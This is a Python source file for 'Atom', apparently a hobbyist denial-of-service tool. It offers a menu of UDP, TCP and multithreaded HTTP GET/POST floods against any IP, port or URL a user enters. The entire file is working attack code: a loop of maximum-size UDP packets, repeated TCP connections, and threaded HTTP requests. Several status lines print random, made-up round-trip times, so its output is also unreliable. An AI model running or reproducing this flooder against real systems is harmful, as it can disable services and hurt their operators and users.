import socket
import sys
import threading
import time
import urllib3
import random
import hmac
import termios
import tty

BLUE = "\033[94m"
RESET = "\033[0m"

logo = """
[0;34m▄▄▄▄▄[0;37m [0;34m▄▄▄▄▄▄[0;37m [0;34m▄▄▄▄▄[0;37m [0;34m▄▄▄[0;37m [0;34m▄▄[0;37m [0m
[0;97;46m▓[0;97m▀▀▀[0;97;47m▓[0;37m [0;97m▀▀[0;97;47m▓[0;97m▀▀▀[0;37m [0;97;47m▓[0;97m▀▀▀[0;97;47m▓[0;37m [0;97;47m▓[0;97m▀▀[0;97;44m▄[0;97m▀▀[0;97;44m▄[0m
[0;97;47m▒[0;34m▌[0;37m [0;34m▐[0;97;47m▒[0;37m   [0;97;47m▒[0;34m▌[0;37m   [0;97;47m▒[0;34m▌[0;37m [0;34m▐[0;97;47m▒[0;37m [0;97;47m▒[0;34m▌▐[0;97;47m▒[0;37m [0;34m▐[0;97;47m▒[0m
[0;97;47m░[0;34m▌[0;37m [0;34m▐[0;97;47m░[0;37m   [0;97;47m░[0;34m▌[0;37m   [0;97;47m░[0;34m▌[0;37m [0;34m▐[0;97;47m░[0;37m [0;97;47m░[0;34m▌▐[0;97;47m░[0;37m [0;34m▐[0;97;47m░[0m
[0;37;47m [0;34m▌[0;37m [0;34m▐[0;34;47m [0;37m   █[0;34m▌[0;37m   [0;34;47m [0;34m▌[0;37m [0;34m▐[0;34;47m [0;37m [0;34;47m [0;34m▌▐[0;34;47m [0;37m [0;34m▐[0;34;47m [0m
[0;90;47m░[0;34m▌[0;37m [0;34m▐[0;90;47m░[0;37m   [0;90;47m░[0;34m▌[0;37m   [0;90;47m░[0;34m▌[0;37m [0;34m▐[0;90;47m░[0;37m [0;90;47m░[0;34m▌[0;37m   [0;34m▐[0;90;47m░[0m
[0;90;47m▒[0;37m▀▀▀[0;90;47m▒[0;37m   [0;90;47m▒[0;34m▌[0;37m   [0;90;47m▒[0;34m▌[0;37m [0;34m▐[0;90;47m▒[0;37m [0;90;47m▒[0;34m▌[0;37m   [0;34m▐[0;90;47m▒[0m
[0;90;47m▓[0;34m▌[0;37m [0;34m▐[0;90;47m▓[0;37m   [0;90;47m▓[0;34m▌[0;37m   [0;90;47m▓[0;34m▌[0;37m [0;34m▐[0;90;47m▓[0;37m [0;90;47m▓[0;34m▌[0;37m   [0;34m▐[0;90;47m▓[0m
[0;90;47m█[0;34m▌[0;37m [0;34m▐[0;90;47m█[0;37m   [0;90;47m█[0;34m▌[0;37m   [0;90m█[0;34m▌[0;37m [0;34m▐[0;90m█[0;37m [0;90m█[0;34m▌[0;37m   [0;34m▐[0;90m█[0m
[0;90m▓[0;34m▌[0;37m [0;34m▐[0;90m▓[0;37m   [0;90m▓[0;34m▌[0;37m   [0;90m▓[0;34m▌[0;37m [0;34m▐[0;90m▓[0;37m [0;90m▓[0;34m▌[0;37m   [0;34m▐[0;90m▓[0m
[0;90m▒[0;34m▌[0;37m [0;34m▐[0;90m▒[0;37m   [0;90m▒[0;34m▌[0;37m   [0;90m▒[0;34m▌[0;37m [0;34m▐[0;90m▒[0;37m [0;90m▒[0;34m▌[0;37m   [0;34m▐[0;90m▒[0m
[0;90m░[0;34m▌[0;37m [0;34m▐[0;90m░[0;37m   [0;90m░[0;34m▌[0;37m   [0;90m░░░░░[0;37m [0;90m░[0;34m▌[0;37m   [0;34m▐[0;90m░[0m
"""

def normalize_url(target):
    if "http://" in target or "https://" in target:
        return target
    return f"http://{target}"


def run_udp_attack(target_ip, target_port, attack_speed):
    message = b"A" * 65507
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"Starting: UDP Attack to: {target_ip}:{target_port}. Press Ctrl+C to stop!")
    time.sleep(2)
    try:    
        while True:
            try:
                rtt = random.randint(10,100)
                bytes_sent = sock.sendto(message, (target_ip, int(target_port)))
                print(f"{BLUE}[Atom Output]:{RESET} Packet Sent to {target_ip}:{target_port},")
                print(f"{BLUE}[Atom Output]:{RESET} Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,")
                time.sleep(float(attack_speed))
            except Exception as exc:
                print(f"{BLUE}[Atom Output]:{RESET} Failed to send packet: {exc}")
                time.sleep(5)
    except KeyboardInterrupt:
        print("\nStopping UDP attack.")
        time.sleep(5)
    finally:
        sock.close()
        print("Socket closed.")


def run_tcp_attack(target_ip, target_port, attack_speed):

    message = b"A" * 1460
    print(f"Starting: TCP Attack to: {target_ip}:{target_port}. Press Ctrl+C to stop!")
    time.sleep(2)
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)  
            try:
                start_time = time.time()
                sock.connect((target_ip, int(target_port)))
                bytes_sent = sock.send(message)
                rtt = int((time.time() - start_time) * 1000)
                
                print(f"{BLUE}[Atom Output]:{RESET} TCP Connection Established & Sent to {target_ip}:{target_port},")
                print(f"{BLUE}[Atom Output]:{RESET} Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,")
            except Exception as exc:
                print(f"{BLUE}[Atom Output]:{RESET} TCP Connection failed: {exc}")
            finally:
                sock.close()
            time.sleep(float(attack_speed))
    except KeyboardInterrupt:
        print("\nStopping TCP attack.")
        time.sleep(5)


def run_http_attack(method, target_url, attack_speed, thread_count):
    manager = urllib3.PoolManager()

    print(f"Starting HTTP Request Attack to {target_url}. Press ctrl c to stop!")
    time.sleep(2)
    def attack():
        while True:
            try:
                rt = random.randint(10,1000)
                response = manager.request(method, target_url, timeout=0.01)
                print(f"{BLUE}[Atom Output]:{RESET} Sent {method} Request Packet to {target_url},")
                print(f"{BLUE}[Atom Output]:{RESET} Status Code: {response.status}, RTT: {rt}ms,")
            except Exception as exc:
                print(f"{BLUE}[Atom Output]:{RESET} {method} request failed: {exc}")
            time.sleep(float(attack_speed))

    threads = []
    for _ in range(int(thread_count)):
        thread = threading.Thread(target=attack, daemon=True)
        thread.start()
        threads.append(thread)

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n Ctrl + c Pressed! stopping attack.")
        print("Attack has stopped successfully!")
        print("Exiting..")
        time.sleep(5)
        sys.exit(1)


def main():
    print(logo)
    print("Welcome, to Atom!")
    print("Version 4.0 [Latest]")
    time.sleep(2)
    print("Produced By Kube0n!")
    print("Socials: [Discord User; kube0n], [Youtube; Kube0nYT]!")
    time.sleep(2)
    print(f"{BLUE}┌──────────────────────────────────────────────┐{RESET}")
    print(f"{BLUE}│                  Methods!                    │{RESET}")
    print(f"{BLUE}├──────────────────────────────────────────────┤{RESET}")
    print(f"{BLUE}│└─ Layer 4                                    │{RESET}")
    print(f"{BLUE}│└─[01] UDP                                    │{RESET}")
    print(f"{BLUE}│└─[02] TCP                                    │{RESET}")
    print(f"{BLUE}│└─ Layer 7                                    │{RESET}")
    print(f"{BLUE}│└─[03] HTTP - GET,POST                        │{RESET}")
    print(f"{BLUE}└──────────────────────────────────────────────┘{RESET}")
    
    method = input("Choose method: ").strip().upper()
    speed = input("Enter attack speed / delay (e.g., 0.1): ").strip()
    
    if method in ("UDP", "TCP"):
        ip = input("Enter Target IP: ").strip()
        port = input("Enter Target Port: ").strip()
        if method == "UDP":
            run_udp_attack(ip, port, speed)
        else:
            run_tcp_attack(ip, port, speed)
            
    elif method == "HTTP":
        http_method = input("Enter HTTP Method (GET/POST): ").strip().upper()
        url = input("Enter Target URL/IP: ").strip()
        threads = input("Enter Thread Count: ").strip()
        normalized = normalize_url(url)
        run_http_attack(http_method, normalized, speed, threads)
    else:
        print("Unknown selection. Exiting.")

if __name__ == "__main__":
    main()